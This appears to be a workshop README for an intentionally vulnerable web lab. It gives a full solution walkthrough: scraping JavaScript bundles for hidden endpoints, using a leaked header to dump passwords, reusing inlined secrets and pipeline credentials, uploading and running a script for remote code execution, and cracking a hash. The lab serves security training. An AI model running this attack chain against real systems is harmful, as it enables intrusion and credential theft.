# BSides Budapest 2026 — Unpacking the Bundle

Modern web apps built with frameworks like Next.js, React, or Vue ship their entire frontend as compiled JavaScript bundles, everything the browser needs to run the app, pre-packaged at build time and served to the client without any obfuscation, just precompilation. This matters to us because:

- **Dead code survives compilation.** Functions that were written but never wired up, old API calls from previous versions, migration helpers left by accident, all of it ends up in the bundle if the compiler can't prove it's unreachable. Developers rarely audit what's actually shipped. This is due to tree shaking, webpack compilers are as efficient as possible, removing unused functions and variables, however, if the developer (or the AI nowadays) forgot to remove it, it'll be part of the JavaScript Code.
- **Buildtime secrets get inlined.** Bundlers like webpack use `DefinePlugin` to replace `process.env.VARIABLE` references with their actual string values at build time. If a developer references an internal secret in clientside code, that secret becomes a string literal in the JS file that every browser downloads.
- **No authentication required to read them.** JS chunks are public static assets. You don't need to be logged in. Any user can download and read them.

The goal here is to treat the JavaScript the same way you'd treat source code in a code review. Start by fetching the login page, extract the chunk URLs from the HTML's `<script>` tags, and run `jsluice` to pull out every URL, endpoint, and header it can find.

## Workshop paths

Two independent target applications ship in this range. Pick either, or run both.

- **Path 1 — SoundMetrics** (this file). Next.js bundle recon with jsluice, a forgotten migration endpoint, a build time secret, and a fake Artifactory pipeline that ends in RCE. Flag is an MD5 you crack with rockyou.txt.
- **Path 2 — TollPay** (see [README-tollpay.md](README-tollpay.md)). A red and black US toll account portal. Same discipline, different payoff: a client side AES key and a JWT signing secret are shipped in the frontend bundle. Decode the token, re-sign it to climb from customer to moderator, find an unauthenticated token minting API disclosed in the moderator bundle, then chain stored XSS against an admin victim to take over the admin account. Flag is an MD5 in the admin settlement report.

The two labs are fully separate. Start only the one you want, so a small droplet runs only what it needs:

```bash
# Path 1 — SoundMetrics (ports 3000 and 8081)
docker compose -f docker-compose.soundmetrics.yml up -d --build

# Path 2 — TollPay (single port 4000; API internal, reverse proxied under /api)
docker compose -f docker-compose.tollpay.yml up -d --build
```

Starting one lab never starts the other. TollPay works by IP with no `/etc/hosts` or extra ports; see [README-tollpay.md](README-tollpay.md).

## What is SoundMetrics?
SoundMetrics is a fictitional vulnerable website, it's based on two pentests I performed before with the same vulns and some new ones I keep finding on current engagements.

##  What's the scenario? 
You're a pentester. The client handed you only a URL. Find sensitive data to enter the site, dig through the javascript code to retrieve sensitive information and achieve RCE!

## What's the flag/objective? What counts as "winning"?
This lab requires you to find a flag consisting of an MD5 hash found by achieving RCE on the server and cracking it using rockyou.txt.

## Tools and requirements 
- docker
- ffuf
- curl
- jq
- seclists
- Burp Suite Community
- Browser with DevTools (Firefox or Chrome)
- golang
- katana (go install github.com/projectdiscovery/katana/cmd/katana@latest)
- jsluice (go install github.com/BishopFox/jsluice/cmd/jsluice@latest)

## Spin the docker with

```bash
cd soundmetrics-range
docker compose -f docker-compose.soundmetrics.yml up -d --build
```

## Solution

### Step 0: Understaing JS bundles

JS Bundles can look like jargon to normal users but like searching for gold in a river, you have to sieve throught the dirt, by searching in the applications chunks we can retrieve sensitive information or deprecated endpoints, taking into advantage the contextual search of jsluice we'll retrieve url's not commonly found to common fuzzers,  

```bash
curl -s http://sm-ui:3000
```

### Step 1 : Enumerate JS bundles, find hidden endpoints
```bash
curl -s http://sm-ui:3000 | \
  grep -oE '/_next/static/chunks/[^"]+' | \
  sed 's|^|http://sm-ui:3000|' | \
  xargs jsluice urls
```

In the output, look for entries from `app/page-*.js` that's the compiled login page. jsluice will surface a `fetch()` call pointing to `/api/v1/users` with method `GET` and a custom header `x-legacy-client: migration-tool-v1`. This is dead code from an old migration helper that a developer forgot to remove before shipping. It never gets called by the UI, but it never got removed either — so webpack kept it in the bundle.

### Step 2 : Hit the forgotten endpoint

```bash
curl -s http://sm-ui:3000/api/v1/users \
  -H "x-legacy-client: migration-tool-v1" | jq .
```
Without the header → 403. With it → full user table, plaintext passwords.

### Step 3 : Login as admin

```bash
curl -s -c cookies.txt -X POST http://sm-ui:3000/api/v2/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"M3_GU5T4_Much0_CSM"}' | jq .
```

### Step 4 : Find the internal secret baked into the admin bundle

```bash
curl -s http://sm-ui:3000/admin \
  -H "Cookie: $(grep sm_session cookies.txt | awk '{print "sm_session="$7}')" | \
  grep -oE '/_next/static/chunks/[^"]+' | \
  sed 's|^|http://sm-ui:3000|' | \
  xargs jsluice urls
```
The admin page references `sm-internal-2026` as the value of the `x-internal-secret` header in a fetch call baked into the client bundle at build time by webpack from an env file. This is the actual vulnerability.

### Step 5 : Access the CI/CD pipeline

```bash
curl -s http://sm-ui:3000/api/v2/pipeline \
  -H "x-internal-secret: sm-internal-2026" | jq .
```
Returns a failed pipeline run. The `publish:artifactory` job logs expose Artifactory credentials in plaintext.

### Step 6 : Authenticate to Artifactory

```bash
curl -s http://sm-jfrog:8081/artifactory/libs-release-local \
  -u "jenkins-build-bot:artifactory_p@ssw0rd_8821!" | jq .
```

### Step 7 : Discover the pipeline endpoints

```bash
curl -s http://sm-jfrog:8081 | \
  grep -oE '/api/[^"]+' | sort -u
```
Or run jsluice against the Artifactory UI JS to find `/api/pipeline/upload` and `/api/pipeline/run`. Direct execution via `/api/deploy` now returns 410.

### Step 8 : Upload a Python script

```bash
curl -s -X POST http://sm-jfrog:8081/api/pipeline/upload \
  -u "jenkins-build-bot:artifactory_p@ssw0rd_8821!" \
  -H "Content-Type: application/json" \
  -d '{"filename":"exploit.py","content":"import os\nprint(open(\"/var/jenkins_home/.secret\").read())"}' | jq .
```
Note the `filename` value returned (e.g. `job-1234567890_exploit.py`).

### Step 9 : Execute the script

```bash
curl -s -X POST http://sm-jfrog:8081/api/pipeline/run \
  -u "jenkins-build-bot:artifactory_p@ssw0rd_8821!" \
  -H "Content-Type: application/json" \
  -d '{"filename":"job-1234567890_exploit.py"}' | jq '.output[]'
```

### Step 10 : Crack the hash

```bash
echo "99f6f4be0908f24bb4a22a4ffb277da4" > hash.txt
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
res: `pipeline`
```